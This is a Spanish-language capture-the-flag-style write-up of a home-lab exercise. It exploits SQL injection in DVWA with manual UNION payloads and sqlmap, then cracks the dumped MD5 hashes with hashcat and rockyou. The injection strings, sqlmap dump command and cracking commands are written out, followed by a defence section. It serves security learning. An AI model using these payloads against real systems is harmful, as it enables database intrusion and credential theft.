# Writeup 01 — SQL Injection en DVWA + crackeo de hashes

**Categoría:** Web / Ofensivo
**Objetivo:** DVWA (Damn Vulnerable Web Application) corriendo en Docker sobre mi Raspberry Pi 5
**Herramientas:** navegador, sqlmap, hashcat
**Nivel de seguridad de DVWA:** `low`

> ⚠️ Todo esto se hizo en mi laboratorio aislado, contra una aplicación vulnerable que instalé yo mismo para practicar.

---

## 🎯 Objetivo del reto

Explotar una vulnerabilidad de **inyección SQL** en el formulario de DVWA para:
1. Confirmar que la entrada no se valida (inyección manual).
2. Extraer la tabla de usuarios de la base de datos.
3. Recuperar las contraseñas crackeando los hashes obtenidos.

---

## 1. Reconocimiento

La aplicación expone un campo "User ID" que consulta la base de datos. La URL del formulario es:

```
http://<IP-DE-MI-PI>/vulnerabilities/sqli/?id=1&Submit=Submit
```

> 📸 *(Insertar aquí captura del formulario — guárdala en `img/` y enlázala)*
> `![Formulario SQLi](img/01-formulario.png)`

Al introducir `1`, la app devuelve el nombre del usuario con ese ID. Eso sugiere que mi entrada se está metiendo directamente en una consulta SQL sin filtrar.

---

## 2. Inyección manual — confirmar la vulnerabilidad

Primera prueba, un clásico para ver si el campo es inyectable:

```sql
1' OR '1'='1
```

**Resultado:** la aplicación devuelve **todos** los usuarios, no solo el ID 1. Eso confirma que la condición `WHERE` se puede manipular → la entrada es vulnerable.

> 📸 *(Captura del resultado mostrando múltiples usuarios)*

### Averiguar el número de columnas

Para poder usar `UNION` necesito saber cuántas columnas devuelve la consulta. Pruebo con `ORDER BY`:

```sql
1' ORDER BY 1 -- -
1' ORDER BY 2 -- -
1' ORDER BY 3 -- -   ← aquí da error
```

El error en `3` indica que la consulta devuelve **2 columnas**.

### Extraer datos con UNION

Sabiendo que son 2 columnas, saco el usuario y el hash de contraseña directamente:

```sql
1' UNION SELECT user, password FROM users -- -
```

**Resultado:** aparece la lista de usuarios con sus contraseñas *hasheadas* (MD5):

| Usuario | Hash (MD5) |
|---------|------------|
| admin   | `<hash>`   |
| gordonb | `<hash>`   |
| 1337    | `<hash>`   |
| pablo   | `<hash>`   |
| smithy  | `<hash>`   |

> 📸 *(Captura de la tabla de usuarios extraída)*

---

## 3. Automatizar con sqlmap

Ya confirmado a mano, ahora lo hago con **sqlmap** para mostrar el flujo automatizado. Necesito mi cookie de sesión (la saco de las herramientas de desarrollador del navegador, pestaña *Application → Cookies*).

```bash
sqlmap -u "http://<IP-DE-MI-PI>/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<mi-session-id>; security=low" \
  --batch --dump
```

**Qué hace cada parte:**
- `-u` → la URL vulnerable
- `--cookie` → sqlmap necesita estar "logueado" en DVWA, por eso le paso la cookie
- `--batch` → responde que sí a todo automáticamente
- `--dump` → vuelca el contenido de la base de datos

sqlmap identifica el tipo de inyección, enumera la base de datos `dvwa`, encuentra la tabla `users` y **vuelca todas las filas**. Además, al reconocer que las contraseñas son hashes MD5, ofrece intentar crackearlas con su diccionario.

> 📸 *(Captura de la salida de sqlmap con la tabla volcada)*

---

## 4. Crackeo de hashes con hashcat

Guardo los hashes obtenidos en un archivo, uno por línea:

```
# hashes.txt
5f4dcc3b5aa765d61d8327deb882cf99
e99a18c428cb38d5f260853678922e03
...
```

Los hashes de DVWA son **MD5**, que en hashcat es el modo `0`. Uso el diccionario clásico **rockyou**:

```bash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Qué hace cada parte:**
- `-m 0` → tipo de hash: MD5
- `hashes.txt` → mis hashes
- `rockyou.txt` → diccionario de contraseñas filtradas reales

Para ver los resultados ya crackeados:

```bash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt --show
```

**Resultado:** todas las contraseñas caen, porque son débiles y están en rockyou:

| Usuario | Contraseña recuperada |
|---------|----------------------|
| admin   | `password`           |
| gordonb | `abc123`             |
| 1337    | `charley`            |
| pablo   | `letmein`            |
| smithy  | `password`           |

> 📸 *(Captura de hashcat mostrando las contraseñas crackeadas)*

---

## 🧠 Qué aprendí

- **La causa raíz** de la inyección SQL es construir consultas concatenando la entrada del usuario sin separarla del código SQL.
- **Cómo pensar la explotación por pasos:** confirmar → contar columnas → extraer con UNION → automatizar.
- Un atacante que llega a la base de datos no termina ahí: los **hashes débiles sin *salt*** (MD5) se rompen en segundos con un diccionario como rockyou.

## 🛡️ Cómo se defiende esto

- **Consultas parametrizadas / prepared statements** — nunca concatenar la entrada del usuario en la consulta. Es *la* defensa principal contra SQLi.
- **Validación y saneamiento** de la entrada (defensa en profundidad, no sustituto de lo anterior).
- **Principio de mínimo privilegio** en la cuenta de base de datos de la app.
- Para las contraseñas: nunca MD5. Usar algoritmos lentos y con *salt* como **bcrypt**, **scrypt** o **Argon2**.
- Un **WAF** ayuda a frenar ataques automáticos, pero no arregla el fallo de fondo.

---

*Writeup realizado en mi home lab · DVWA en Docker · Raspberry Pi 5*
